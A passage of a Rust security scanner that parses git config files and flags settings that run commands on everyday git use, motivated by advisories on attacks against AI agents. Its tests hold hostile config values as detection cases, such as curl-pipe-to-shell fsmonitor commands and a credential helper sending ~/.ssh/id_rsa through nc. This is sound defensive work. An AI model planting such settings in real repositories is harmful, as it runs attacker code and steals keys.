//! Git config that runs commands. Agents run `git` in repos they did not write, and
//! a repo's config can name programs git runs on everyday commands: core.fsmonitor on
//! `git status`, core.pager on `git log`, filters on checkout (VulnCheck Hermes advisory,
//! https://www.vulncheck.com/advisories/hermes-agent-rce-via-git-core-fsmonitor-config-injection ;
//! Copilot CLI GHSA-9ccr-r5hg-74gf, a nested bare repo whose config sits in the folder itself,
//! https://github.com/github/copilot-cli/security/advisories/GHSA-9ccr-r5hg-74gf).
//! Parses config files the way git does (quotes, escapes, line continuations, old-style
//! `[section.sub]` headers); never runs git.

use std::path::{Path, PathBuf};

use crate::models::{Category, Finding, Inspection, ScanContext, Severity};

pub const GIT_CONFIG_SUB_CATEGORY: &str = "Git config that runs commands";

/// One `key = value` setting. Section and key are lowercased; the subsection keeps its case.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Entry {
    pub line: usize,
    pub section: String,
    pub subsection: Option<String>,
    pub key: String,
    pub value: String,
}

/// `[name "sub"]`, `[name.sub]` (old style) or `[name]`.
fn parse_header(h: &str) -> (String, Option<String>) {
    let h = h.trim();
    if let Some(q) = h.find('"') {
        let mut sub = String::new();
        let mut chars = h[q + 1..].chars();
        while let Some(c) = chars.next() {
            match c {
                '\\' => sub.extend(chars.next()),
                '"' => break,
                c => sub.push(c),
            }
        }
        return (h[..q].trim().to_ascii_lowercase(), Some(sub));
    }
    match h.split_once('.') {
        Some((name, sub)) => (
            name.trim().to_ascii_lowercase(),
            Some(sub.trim().to_ascii_lowercase()),
        ),
        None => (h.to_ascii_lowercase(), None),
    }
}

/// A value from `chars` (after `=`), joining quoted and unquoted parts, handling escapes and
/// a trailing `\` that continues the value on the next line. Returns the value and how many
/// extra lines it used.
fn parse_value(
    first: &str,
    rest: &mut std::iter::Peekable<std::str::Lines<'_>>,
) -> (String, usize) {
    let mut out = String::new();
    let mut pending_ws = String::new();
    let mut quoted = false;
    let mut extra = 0;
    let mut line = first.to_string();
    'lines: loop {
        let mut chars = line.chars().peekable();
        while let Some(c) = chars.next() {
            match c {
                '\\' => match chars.next() {
                    None => {
                        // Continuation: the value goes on with the next line.
                        if let Some(next) = rest.next() {
                            extra += 1;
                            line = next.to_string();
                            continue 'lines;
                        }
                        break 'lines;
                    }
                    Some(e) => {
                        out.push_str(&std::mem::take(&mut pending_ws));
                        out.push(match e {
                            'n' => '\n',
                            't' => '\t',
                            'b' => '\u{8}',
                            other => other,
                        });
                    }
                },
                '"' => {
                    out.push_str(&std::mem::take(&mut pending_ws));
                    quoted = !quoted;
                }
                ';' | '#' if !quoted => break 'lines,
                c if c.is_whitespace() && !quoted => {
                    if !out.is_empty() {
                        pending_ws.push(c);
                    }
                }
                c => {
                    out.push_str(&std::mem::take(&mut pending_ws));
                    out.push(c);
                }
            }
        }
        break;
    }
    (out, extra)
}

pub fn parse_git_config(text: &str) -> Vec<Entry> {
    let mut entries = Vec::new();
    let (mut section, mut subsection) = (String::new(), None);
    let mut lines = text.lines().peekable();
    let mut n = 0;
    while let Some(raw) = lines.next() {
        n += 1;
        let mut line = raw.trim();
        if line.starts_with('[') {
            let Some(end) = line.find(']') else { continue };
            (section, subsection) = parse_header(&line[1..end]);
            line = line[end + 1..].trim();
        }
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let key_end = line
            .find(|c: char| c == '=' || c.is_whitespace())
            .unwrap_or(line.len());
        let key = line[..key_end].to_ascii_lowercase();
        let after = line[key_end..].trim_start();
        let start = n;
        let value = match after.strip_prefix('=') {
            Some(v) => {
                let (v, extra) = parse_value(v, &mut lines);
                n += extra;
                v
            }
            None => String::new(),
        };
        entries.push(Entry {
            line: start,
            section: section.clone(),
            subsection: subsection.clone(),
            key,
            value,
        });
    }
    entries
}

fn is_bool(v: &str) -> bool {
    matches!(
        v.to_ascii_lowercase().as_str(),
        "" | "true" | "false" | "yes" | "no" | "on" | "off" | "1" | "0"
    )
}

/// Characters that make a value run more than one plain program. `$VAR` alone is not one.
fn has_shell_meta(v: &str) -> bool {
    v.contains([';', '|', '&', '`', '>', '<', '\n']) || v.contains("$(")
}

fn in_untrusted_place(v: &str) -> bool {
    let p = v.trim_end_matches('/');
    ["/tmp", "/private/tmp", "/var/tmp", "/private/var/tmp"]
        .iter()
        .any(|t| p == *t || p.starts_with(&format!("{t}/")))
        || p.ends_with("/Downloads")
        || p.contains("/Downloads/")
}

fn program_name(v: &str) -> &str {
    let first = v.split_whitespace().next().unwrap_or("");
    first.rsplit('/').next().unwrap_or(first)
}

/// ssh -o options that only tune the connection; anything else (ProxyCommand, Include,
/// KnownHostsCommand, PKCS11Provider, ...) can run a program or load another file.
#[rustfmt::skip]
const SAFE_SSH_OPTIONS: &[&str] = &[
    "identitiesonly", "identityfile", "stricthostkeychecking", "userknownhostsfile", "port", "user",
    "serveraliveinterval", "serveralivecountmax", "connecttimeout", "batchmode", "addkeystoagent",
    "usekeychain", "hostkeyalias", "loglevel", "preferredauthentications", "pubkeyauthentication",
];

/// Split like the shell: whitespace separates words, quotes group them and are dropped.
fn shell_words(v: &str) -> Vec<String> {
    let (mut out, mut cur, mut quote, mut started) = (Vec::new(), String::new(), None, false);
    for c in v.chars() {
        match quote {
            Some(q) if c == q => quote = None,
            Some(_) => cur.push(c),
            None if c == '"' || c == '\'' => (quote, started) = (Some(c), true),
            None if c.is_whitespace() => {
                if started || !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                    started = false;
                }
            }
            None => cur.push(c),
        }
    }
    if started || !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// `ssh` with only allowlisted flags and options. Quotes are dropped first, as the shell would.
fn plain_ssh(v: &str) -> bool {
    if has_shell_meta(v) {
        return false;
    }
    let words = shell_words(v);
    if !matches!(
        words.first().map(String::as_str),
        Some("ssh" | "/usr/bin/ssh")
    ) {
        return false;
    }
    // ssh accepts `Key=value` and `Key value` (e.g. -o "Port 22").
    let safe_opt = |o: &str| {
        o.split_once(|c: char| c == '=' || c.is_whitespace())
            .is_some_and(|(k, _)| SAFE_SSH_OPTIONS.contains(&k.to_ascii_lowercase().as_str()))
    };
    let mut i = 1;
    while i < words.len() {
        let w = words[i].as_str();
        i += match w {
            "-i" | "-p" | "-l" => 2,
            "-o" if words.get(i + 1).is_some_and(|o| safe_opt(o)) => 2,
            "-4" | "-6" | "-q" | "-T" | "-v" | "-vv" | "-vvv" => 1,
            _ if w.len() > 2 && w.starts_with("-o") && safe_opt(&w[2..]) => 1,
            _ if w.len() > 2 && (w.starts_with("-i") || w.starts_with("-p")) => 1,
            _ => return false,
        };
    }
    true
}

/// A program named without a folder (found on PATH) or installed in a system or Homebrew
/// folder, with no `.`/`..` segments that could step out of it.
fn trusted_program(cmd: &str) -> bool {
    let first = cmd.split_whitespace().next().unwrap_or("");
    let dirs = ["/opt/homebrew/", "/usr/local/", "/usr/bin/", "/Library/"];
    !first.split('/').any(|s| s == ".." || s == ".")
        && (!first.contains('/') || dirs.iter().any(|d| first.starts_with(d)))
}

/// Credential helpers that well-known CLIs install, exactly as they write them.
fn known_helper(v: &str) -> bool {
    let Some(cmd) = v.strip_prefix('!') else {
        return false;
    };
    let cmd = cmd.trim();
    if has_shell_meta(cmd) || cmd.contains('#') || !trusted_program(cmd) {
        return false;
    }
    let args: Vec<&str> = cmd.split_whitespace().skip(1).collect();
    match program_name(cmd) {
        "gh" | "glab" => args == ["auth", "git-credential"],
        "aws" => args == ["codecommit", "credential-helper", "$@"],
        name => name.starts_with("git-credential-"),
    }
}

/// Husky's hook folder (`.husky`, or `.husky/_` from v9), also inside a monorepo subfolder.
fn husky(v: &str) -> bool {
    let p = v.trim_end_matches('/');
    // Only inside the repo: a relative path with no `..` steps, not absolute or home-relative.
    if p.starts_with('~') || p.starts_with('/') || p.split('/').any(|s| s == "..") {
        return false;
    }
    p == ".husky" || p == ".husky/_" || p.ends_with("/.husky") || p.ends_with("/.husky/_")
}

/// Stock git-lfs filter commands.
fn lfs_filter(v: &str) -> bool {
    !has_shell_meta(v) && (v.starts_with("git-lfs ") || v.starts_with("git lfs "))
}

/// A risky setting: finding id and what it does. `repo_local` is a repo's own config.
#[rustfmt::skip]
pub fn check_entry(
    section: &str,
    subsection: Option<&str>,
    key: &str,
    value: &str,
    repo_local: bool,
) -> Option<(&'static str, &'static str)> {
    let v = value.trim();
    let named = subsection.is_some();
    let untrusted_helper = v.starts_with('/') && (in_untrusted_place(v) || (repo_local && !trusted_program(v)));
    let hit = match (section, named, key) {
        ("core", false, "fsmonitor") if !is_bool(v) => ("git-config-fsmonitor-command", "core.fsmonitor runs a command on every `git status`, including ones an AI agent runs"),
        ("core", false, "sshcommand") if repo_local && !plain_ssh(v) => ("git-config-ssh-command", "core.sshCommand runs a custom command on every fetch and push"),
        ("core", false, "askpass") if repo_local && !v.is_empty() => ("git-config-askpass-command", "core.askpass runs a custom program whenever git needs a password"),
        ("core", false, "hookspath") if in_untrusted_place(v) => ("git-config-hooks-path", "core.hooksPath points git hooks at a temporary or Downloads folder"),
        ("core", false, "hookspath") if repo_local && !v.is_empty() && !husky(v) => ("git-config-hooks-path", "core.hooksPath in a repo's config points git at another hooks folder, whose scripts run on commit, checkout and similar"),
        // git ignores this key in a repo's own config (protected config only), so only global/system.
        ("uploadpack", false, "packobjectshook") if !repo_local && !v.is_empty() => ("git-config-remote-command", "uploadpack.packObjectsHook runs a command whenever a repo on this Mac serves a fetch"),
        ("remote", true, "vcs") if repo_local && !v.is_empty() => ("git-config-remote-command", "remote.<name>.vcs runs a git-remote-<vcs> helper program on fetch and push"),
        ("browser", true, "cmd") if repo_local && !v.is_empty() => ("git-config-tool-command", "browser.<name>.cmd runs a command when git opens a web page"),
        ("submodule", true, "update") if repo_local && v.starts_with('!') => ("git-config-submodule-command", "submodule.<name>.update runs a shell command on `git submodule update`"),
        ("remote", true, "uploadpack" | "receivepack") if repo_local && !v.is_empty() => ("git-config-remote-command", "a remote's uploadpack/receivepack runs a custom program on fetch or push"),
        // git compares case-insensitively, and "user" also allows a protocol when an agent runs git itself.
        ("protocol", true, "allow") if repo_local && subsection == Some("ext") && !v.eq_ignore_ascii_case("never") => ("git-config-protocol-ext", "protocol.ext.allow lets ext:: remote URLs run commands"),
        ("protocol", false, "allow") if repo_local && (v.eq_ignore_ascii_case("always") || v.eq_ignore_ascii_case("user")) => ("git-config-protocol-ext", "protocol.allow lets ext:: remote URLs run commands"),
        ("difftool" | "mergetool", true, "cmd") if repo_local && !v.is_empty() => ("git-config-tool-command", "a difftool/mergetool cmd runs a command when the tool is used"),
        ("credential", _, "helper") if (v.starts_with('!') && !known_helper(v)) || untrusted_helper => ("git-config-credential-command", "credential.helper runs a program that receives your git credentials"),
        ("filter", true, "smudge" | "clean" | "process") if repo_local && !lfs_filter(v) => ("git-config-filter-command", "a filter runs a command on checkout or commit"),
        ("diff", true, "textconv" | "command") | ("diff", false, "external") if repo_local && !v.is_empty() => ("git-config-diff-command", "a diff setting runs a command whenever a diff is shown"),
        ("merge", true, "driver") if repo_local && !v.is_empty() => ("git-config-merge-driver", "a merge driver runs a command during merges"),
        ("core", false, "pager") | ("pager", false, _) if repo_local && !is_bool(v) => ("git-config-pager-command", "a pager setting runs a command on `git log`, `git diff` and similar"),
        ("core" | "sequence", false, "editor") if repo_local && !v.is_empty() => ("git-config-editor-command", "an editor setting runs a command on commit, rebase and similar"),
        ("gpg", _, "program") if repo_local && !v.is_empty() => ("git-config-gpg-program", "gpg.program runs a command whenever git signs or verifies"),
        ("core", false, "gitproxy") if repo_local && !v.is_empty() => ("git-config-proxy-command", "core.gitProxy runs a command for git:// connections"),
        ("alias", false, _) if repo_local && v.starts_with('!') => ("git-config-alias-command", "an alias runs a shell command"),
        ("safe", false, "directory") if v == "*" => ("git-config-safe-directory-any", "safe.directory = * turns off git's check against repositories owned by other users"),
        _ => return None,
    };
    Some(hit)
}

/// System-wide configs: Apple git, Homebrew on Apple silicon and on Intel.
#[rustfmt::skip]
const SYSTEM_CONFIGS: [&str; 3] = ["/etc/gitconfig", "/opt/homebrew/etc/gitconfig", "/usr/local/etc/gitconfig"];

pub fn scan_git_config(ctx: &ScanContext) -> (Vec<Finding>, Vec<Inspection>) {
    let home = std::env::var_os("MACFLOW_HOME")
        .or_else(|| std::env::var_os("HOME"))
        .map(PathBuf::from);
    let dirs = crate::agent::tasks_secrets::project_dirs(ctx);
    scan_git_config_with(
        ctx,
        home.as_deref(),
        &dirs,
        &SYSTEM_CONFIGS.map(PathBuf::from),
    )
}

/// The name `git config` uses for a setting: section.subsection.key.
fn full_name(e: &Entry) -> String {
    match &e.subsection {
        Some(sub) => format!("{}.{sub}.{}", e.section, e.key),
        None => format!("{}.{}", e.section, e.key),
    }
}

/// `repo`: the working folder for a repo's own config (None for global and system files).
fn findings_for(path: &Path, repo: Option<&Path>, scope: &str) -> Vec<Finding> {
    let Ok(text) = std::fs::read_to_string(path) else {
        return Vec::new();
    };
    let shown = path.to_string_lossy();
    let severity = if repo.is_some() {
        Severity::High
    } else {
        Severity::Medium
    };
    let entries = parse_git_config(&text);
    // protocol.ext.allow = never in the same file overrides a broad protocol.allow.
    let ext_never = entries.iter().any(|e| {
        e.section == "protocol"
            && e.subsection.as_deref() == Some("ext")
            && e.key == "allow"
            && e.value.trim().eq_ignore_ascii_case("never")
    });
    entries
        .into_iter()
        .filter(|e| !(ext_never && e.section == "protocol" && e.subsection.is_none()))
        .filter_map(|e| {
            let (id, what) = check_entry(&e.section, e.subsection.as_deref(), &e.key, &e.value, repo.is_some())?;
            let name = full_name(&e);
            let git = match repo {
                Some(r) => format!("git -C {} config", r.display()),
                None => "git config --global".to_string(),
            };
            let fix = if id == "git-config-safe-directory-any" {
                "List the specific repositories instead: `git config --global --unset-all safe.directory`, then `git config --global --add safe.directory <path>` for each.".to_string()
            } else {
                format!("If you did not set this, remove it with `{git} --unset-all '{name}'` (or edit {shown}) and treat the repository as untrusted.")
            };
            Some(
                Finding::new(id, format!("Git config: {what}"), Category::Security, severity, format!("{shown} line {} sets {name}. Values are not shown.", e.line))
                    .with_sub_category(GIT_CONFIG_SUB_CATEGORY)
                    .with_scope(scope)
                    .with_location(shown.as_ref(), Some(e.line))
                    .with_remediation(fix),
            )
        })
        .collect()
}

fn expand(p: &str, home: &Path, base: &Path) -> PathBuf {
    if let Some(rest) = p.strip_prefix("~/") {
        home.join(rest)
    } else if Path::new(p).is_absolute() {
        PathBuf::from(p)
    } else {
        base.join(p)
    }
}

/// Files a global config pulls in with include.path / includeIf.<cond>.path, a few levels deep.
fn with_includes(files: Vec<PathBuf>, home: &Path) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    let mut queue = files;
    while let Some(f) = queue.pop() {
        if out.contains(&f) || out.len() > 32 || !f.is_file() {
            continue;
        }
        if let Ok(text) = std::fs::read_to_string(&f) {
            let base = f.parent().unwrap_or(Path::new("/")).to_path_buf();
            queue.extend(
                parse_git_config(&text)
                    .into_iter()
                    .filter(|e| {
                        matches!(e.section.as_str(), "include" | "includeif")
                            && e.key == "path"
                            && !e.value.is_empty()
                    })
                    .map(|e| expand(&e.value, home, &base)),
            );
        }
        out.push(f);
    }
    out
}

/// The git dir behind a `.git` file (`gitdir: <path>`), and for a worktree its common dir.
fn gitdir_from_file(dot_git: &Path) -> Option<PathBuf> {
    let text = std::fs::read_to_string(dot_git).ok()?;
    let target = text.lines().find_map(|l| l.strip_prefix("gitdir:"))?.trim();
    let dir = expand(target, Path::new("/"), dot_git.parent()?);
    match std::fs::read_to_string(dir.join("commondir")) {
        Ok(common) => Some(expand(common.trim(), Path::new("/"), &dir)),
        Err(_) => Some(dir),
    }
}

/// Bare repos anywhere under a checkout, including vendor/ and dot-folders the shared folder
/// walker skips (GHSA-9ccr-r5hg-74gf hides one in vendor/). Bounded by depth and a folder budget.
fn bare_repos_under(dir: &Path, depth: usize, budget: &mut usize, out: &mut Vec<PathBuf>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for p in entries.flatten().map(|e| e.path()) {
        let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if *budget == 0
            || !p.is_dir()
            || p.is_symlink()
            || matches!(name, ".git" | "node_modules" | "target")
        {
            continue;
        }
        *budget -= 1;
        if is_bare_repo(&p) {
            out.push(p);
        } else if depth > 0 {
            bare_repos_under(&p, depth - 1, budget, out);
        }
    }
}

fn is_bare_repo(d: &Path) -> bool {
    d.join("HEAD").is_file()
        && d.join("objects").is_dir()
        && d.join("refs").is_dir()
        && d.join("config").is_file()
}

/// Config files of the repos in `dirs`: (config file, working folder). Worktrees resolve to
/// their main repo's config, submodule configs under .git/modules are included, and a nested
/// bare repo's config is read from the folder itself.
fn repo_configs(dirs: &[PathBuf]) -> Vec<(PathBuf, PathBuf)> {
    let mut out: Vec<(PathBuf, PathBuf)> = Vec::new();
    for d in dirs {
        let dot_git = d.join(".git");
        let git_dir = if dot_git.is_dir() {
            Some(dot_git)
        } else if dot_git.is_file() {
            gitdir_from_file(&dot_git)
        } else {
            None
        };
        if git_dir.is_some() {
            let mut bare = Vec::new();
            bare_repos_under(d, 6, &mut 20_000, &mut bare);
            out.extend(bare.into_iter().map(|b| (b.join("config"), b)));
        }
        if let Some(g) = git_dir {
            let g = g.canonicalize().unwrap_or(g);
            out.push((g.join("config"), d.clone()));
            if let Ok(mods) = std::fs::read_dir(g.join("modules")) {
                out.extend(mods.flatten().map(|m| (m.path().join("config"), d.clone())));
            }
        } else if is_bare_repo(d) {
            out.push((d.join("config"), d.clone()));
        }
    }
    out.retain(|(c, _)| c.is_file());
    out.sort();
    out.dedup_by(|a, b| a.0 == b.0);
    out
}

pub fn scan_git_config_with(
    ctx: &ScanContext,
    home: Option<&Path>,
    project_dirs: &[PathBuf],
    system_files: &[PathBuf],
) -> (Vec<Finding>, Vec<Inspection>) {
    if !ctx.is_category_selected(Category::Security) {
        return (
            Vec::new(),
            vec![Inspection::skipped(
                Category::Security,
                Some(GIT_CONFIG_SUB_CATEGORY),
                Some("category not selected"),
            )],
        );
    }
    let mut findings = Vec::new();
    let mut roots: Vec<PathBuf> = system_files.to_vec();
    if let Some(h) = home {
        let xdg = std::env::var_os("XDG_CONFIG_HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|| h.join(".config"));
        roots.extend([h.join(".gitconfig"), xdg.join("git/config")]);
    }
    let globals = with_includes(roots, home.unwrap_or(Path::new("/")));
    let global_scope = if globals.is_empty() {
        "user (no global git config)"
    } else {
        "user (global git config)"
    };
    for p in &globals {
        findings.extend(findings_for(p, None, global_scope));
    }
    let repos = repo_configs(project_dirs);
    // Count repositories, not config files (submodule and bare-repo configs share a checkout).
    let n = repos
        .iter()
        .map(|(_, d)| d)
        .collect::<std::collections::BTreeSet<_>>()
        .len();
    let repo_scope = match n {
        0 => "proj (no git repos)".to_string(),
        1 => "proj (1 repo)".to_string(),
        n => format!("proj ({n} repos)"),
    };
    for (cfg, dir) in &repos {
        let git_dir = cfg.parent().unwrap_or(dir);
        for f in with_includes(vec![cfg.clone()], home.unwrap_or(Path::new("/"))) {
            // A file outside the repo that its config includes (say ~/.gitconfig-work) is the
            // user's own config: judged by the global rules, at Medium.
            let own = f.starts_with(dir) || f.starts_with(git_dir);
            findings.extend(findings_for(&f, own.then_some(dir.as_path()), &repo_scope));
        }
    }
    let inspected = |scope: String| {
        Inspection::inspected(Category::Security, Some(GIT_CONFIG_SUB_CATEGORY), scope)
    };
    (
        findings,
        vec![inspected(global_scope.to_string()), inspected(repo_scope)],
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::InspectionStatus;
    use std::fs;
    use std::sync::atomic::{AtomicU64, Ordering};

    fn tmp() -> PathBuf {
        static N: AtomicU64 = AtomicU64::new(0);
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let n = N.fetch_add(1, Ordering::Relaxed);
        let p = std::env::temp_dir().join(format!("gc_{}_{n}_{nanos}", std::process::id()));
        p
    }

    fn by(f: &[Finding], pred: impl Fn(&Finding) -> bool) -> &Finding {
        f.iter()
            .find(|x| pred(x))
            .unwrap_or_else(|| panic!("not found in {f:?}"))
    }

    /// Write a file, creating its folders.
    fn w(p: &Path, s: &str) {
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, s).unwrap();
    }

    /// Parsed entries as "line section[.sub].key=value".
    fn parsed(text: &str) -> Vec<String> {
        parse_git_config(text)
            .iter()
            .map(|e| format!("{} {}={}", e.line, full_name(e), e.value))
            .collect()
    }

    #[test]
    fn test_parses_sections_subsections_and_quotes() {
        let text = "[core]\n\tfsmonitor = \"touch /tmp/x\"\n[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[credential \"https://github.com\"]\n\thelper = !gh auth git-credential\n# comment\n; other\n[Diff \"img\"] textconv = exiftool\n";
        assert_eq!(
            parsed(text),
            [
                "2 core.fsmonitor=touch /tmp/x",
                "4 filter.lfs.smudge=git-lfs smudge -- %f",
                "6 credential.https://github.com.helper=!gh auth git-credential",
                "9 diff.img.textconv=exiftool",
            ]
        );
    }

    #[test]
    fn test_parses_values_the_way_git_does() {
        // Quoted and unquoted parts join; ; and # end the value only outside quotes.
        let text = "[core]\n\tfsmonitor = \"true\" && curl x | sh\n\tpager = tr\"ue\" x ; trailing comment\n\teditor = \"vim # not a comment\"\n\taskpass = a\\\n b\n\tsshCommand = \"ssh\" -o ProxyCommand=\\\"nc x\\\"\n[filter.evil]\n\tsmudge = sh x\n";
        let got = parse_git_config(text);
        assert_eq!(got[0].value, "true && curl x | sh");
        assert_eq!(got[1].value, "true x");
        assert_eq!(got[2].value, "vim # not a comment");
        assert_eq!((got[3].line, got[3].value.as_str()), (5, "a b"));
        assert_eq!(got[4].value, "ssh -o ProxyCommand=\"nc x\"");
        assert_eq!(parsed(text)[5], "9 filter.evil.smudge=sh x");
    }

    /// `case` is "section[.sub].key=value".
    fn flagged(case: &str, local: bool) -> bool {
        let (name, value) = case.split_once('=').unwrap();
        let parts: Vec<&str> = name.split('.').collect();
        let sub = (parts.len() == 3).then(|| parts[1]);
        check_entry(parts[0], sub, parts[parts.len() - 1], value, local).is_some()
    }

    #[test]
    fn test_command_valued_keys_flagged() {
        let local = [
            "core.fsmonitor=curl -s https://x.example/p | sh",
            "core.fsmonitor=true && curl x | sh",
            "core.sshcommand=ssh -i k; curl x | sh",
            "core.sshcommand=/tmp/ssh-wrapper",
            "core.sshcommand=ssh -o ProxyCommand=\"nc x 22\"",
            "core.sshcommand=ssh -F /tmp/evil",
            "core.sshcommand=ssh -oLocalCommand=id",
            "core.sshcommand=ssh -o KnownHostsCommand=./x",
            "core.sshcommand=ssh -o \"Include /tmp/x\"",
            "core.sshcommand=ssh -vF /tmp/evil",
            "core.sshcommand=ssh -o PKCS11Provider=/tmp/p.dylib",
            "credential.helper=!./gh auth git-credential",
            "credential.helper=!/tmp/aws codecommit credential-helper $@",
            "credential.helper=!/tmp/git-credential-x",
            "credential.helper=!/usr/bin/../../tmp/gh auth git-credential",
            "credential.helper=/usr/local/../../tmp/evil",
            "credential.helper=/Users/dev/repo/helper",
            "core.askpass=/tmp/ask.sh",
            "credential.helper=!f() { cat ~/.ssh/id_rsa | nc x 9; }; f",
            "credential.helper=!curl evil|sh #git-credential-x",
            "credential.helper=!gh auth git-credential; curl x|sh",
            "credential.helper=/tmp/helper",
            "filter.x.smudge=sh -c 'curl x|sh'",
            "filter.lfs.smudge=git-lfs; curl x|sh",
            "filter.x.process=./run.sh",
            "diff.img.textconv=sh evil.sh",
            "diff.img.command=./d.sh",
            "diff.external=./d.sh",
            "merge.ours.driver=./m.sh %O %A %B",
            "core.pager=sh -c 'curl x|sh'",
            "pager.log=./p.sh",
            "core.editor=./e.sh",
            "sequence.editor=./e.sh",
            "gpg.program=./g.sh",
            "gpg.ssh.program=./g.sh",
            "core.gitproxy=./proxy.sh",
            "alias.st=!curl x | sh",
            "core.hookspath=/tmp/hooks",
            "core.hookspath=/var/tmp/hooks",
            "core.hookspath=/Users/dev/Downloads",
            "core.hookspath=.githooks",
            "submodule.lib.update=!./run.sh",
            "remote.origin.uploadpack=./up.sh",
            "remote.origin.receivepack=./rp.sh",
            "protocol.allow=always",
            "protocol.ext.allow=always",
            "protocol.ext.allow=user",
            "protocol.ext.allow=Always",
            "protocol.allow=user",
            "core.hookspath=/Users/dev/proj/.githooks",
            "difftool.x.cmd=./d.sh",
            "mergetool.x.cmd=./m.sh",
            "remote.origin.vcs=evil",
            "browser.x.cmd=./b.sh",
            "core.hookspath=../../outside/.husky",
            "core.hookspath=~/x/.husky",
            "core.hookspath=/opt/evil/.husky",
        ];
        for case in local {
            assert!(flagged(case, true), "missed {case}");
        }
        assert!(flagged("core.fsmonitor=/Users/x/fsmon.sh", false));
        assert!(flagged("safe.directory=*", false));
        // git honours packObjectsHook only in protected (global/system) config, never a repo's.
        assert!(flagged("uploadpack.packobjectshook=./x.sh", false));
        assert!(!flagged("uploadpack.packobjectshook=./x.sh", true));
    }

    #[test]
    fn test_normal_configs_quiet() {
        let local = [
            "core.fsmonitor=true",
            "core.sshcommand=ssh -i ~/.ssh/id_work -o IdentitiesOnly=yes",
            "core.sshcommand=ssh -i $HOME/.ssh/id_work",
            "core.sshcommand=ssh -o \"Port 22\"",
            "core.sshcommand=ssh -i \"/Users/dev/My Keys/id\"",
            "core.hookspath=",
            "core.pager=",
            "credential.helper=./helper",
            "core.sshcommand=ssh -p 2222 -o StrictHostKeyChecking=accept-new -v",
            "credential.helper=!/usr/local/bin/git-credential-manager",
            "core.hookspath=.husky/_",
            "core.hookspath=.husky",
            "submodule.lib.update=rebase",
            "protocol.file.allow=user",
            "pager.branch=false",
            "alias.st=status -sb",
            "credential.helper=!gh auth git-credential",
            "filter.lfs.process=git-lfs filter-process",
            "filter.lfs.clean=git lfs clean -- %f",
        ];
        let global = [
            "core.fsmonitor=false",
            "core.hookspath=/tmpfoo/hooks",
            "core.pager=less -R",
            "core.editor=code --wait",
            "credential.helper=osxkeychain",
            "credential.helper=!/opt/homebrew/bin/gh auth git-credential",
            "credential.helper=",
            "credential.helper=manager",
            "credential.helper=cache --timeout=3600",
            "filter.lfs.smudge=git-lfs smudge -- %f",
            "diff.img.textconv=exiftool",
            "safe.directory=/Users/dev/shared-repo",
            "user.email=dev@example.com",
        ];
        for case in local {
            assert!(!flagged(case, true), "{case} (repo)");
        }
        for case in global {
            assert!(!flagged(case, false), "{case} (global)");
        }
    }

    #[test]
    fn test_scan_repo_local_high_global_medium_with_scopes() {
        let home = tmp();
        w(&home.join(".gitconfig"), "[safe]\n\tdirectory = *\n[credential]\n\thelper = osxkeychain\n[include]\n\tpath = ~/.gitconfig-extra\n");
        w(
            &home.join(".gitconfig-extra"),
            "[core]\n\tfsmonitor = ~/fsmon.sh\n",
        );
        let repo = home.join("projects/app");
        w(&repo.join(".git/config"), "[core]\n\trepositoryformatversion = 0\n\tfsmonitor = \"echo pwned > /tmp/p\"\n[filter \"x\"]\n\tsmudge = sh x\n");
        let clean = home.join("projects/clean");
        w(
            &clean.join(".git/config"),
            "[core]\n\thookspath = .husky/_\n",
        );

        let dirs = vec![home.join("projects"), repo.clone(), clean.clone()];
        let (f, i) = scan_git_config_with(&ScanContext::new(), Some(&home), &dirs, &[]);
        assert_eq!(f.len(), 4, "{f:?}");
        let local = by(&f, |x| {
            x.id == "git-config-fsmonitor-command" && x.severity == Severity::High
        });
        assert_eq!(local.line_number, Some(3));
        assert_eq!(local.scope.as_deref(), Some("proj (2 repos)"));
        let filter = by(&f, |x| x.id == "git-config-filter-command");
        let fix = filter.remediation.as_deref().unwrap();
        assert!(fix.contains("--unset-all 'filter.x.smudge'"), "{fix}");
        assert!(fix.contains(&format!("git -C {}", repo.display())), "{fix}");
        let global = by(&f, |x| x.id == "git-config-safe-directory-any");
        assert_eq!(global.severity, Severity::Medium);
        assert_eq!(global.scope.as_deref(), Some("user (global git config)"));
        // Included files are part of the global config.
        let inc = by(&f, |x| {
            x.file_path
                .as_deref()
                .unwrap_or("")
                .ends_with(".gitconfig-extra")
        });
        assert_eq!(inc.severity, Severity::Medium);
        for x in &f {
            assert!(i.iter().any(|insp| matches!(&insp.status,
                InspectionStatus::Inspected { inspected_scope } if Some(inspected_scope) == x.scope.as_ref())));
        }
    }

    #[test]
    fn test_worktrees_submodules_bare_repos_and_system_config() {
        let home = tmp();
        // A worktree: .git is a file pointing at the real git dir.
        let real = home.join("projects/app/.git");
        w(&real.join("config"), "[core]\n\tpager = ./p.sh\n");
        w(&real.join("worktrees/feat/commondir"), "../..\n");
        let wt = home.join("projects/feat");
        w(
            &wt.join(".git"),
            &format!("gitdir: {}\n", real.join("worktrees/feat").display()),
        );
        // A submodule's config lives under .git/modules.
        w(
            &real.join("modules/lib/config"),
            "[core]\n\teditor = ./e.sh\n",
        );
        // A repo config can include another file.
        w(&real.join("extra.cfg"), "[core]\n\tgitproxy = ./gp.sh\n");
        w(
            &real.join("config"),
            "[core]\n\tpager = ./p.sh\n[include]\n\tpath = extra.cfg\n",
        );
        // A nested bare repo (GHSA-9ccr-r5hg-74gf): config sits directly in the folder, under vendor/.
        let bare = home.join("projects/app/vendor/evil");
        for d in ["objects", "refs"] {
            fs::create_dir_all(bare.join(d)).unwrap();
        }
        w(&bare.join("HEAD"), "ref: refs/heads/main\n");
        w(
            &bare.join("config"),
            "[core]\n\tbare = true\n\tfsmonitor = ./x.sh\n",
        );
        let system = home.join("etc/gitconfig");
        w(&system, "[safe]\n\tdirectory = *\n");

        // Only the repo roots are passed in: the bare repo under vendor/ must be found by walking.
        let dirs = vec![home.join("projects/app"), wt.clone()];
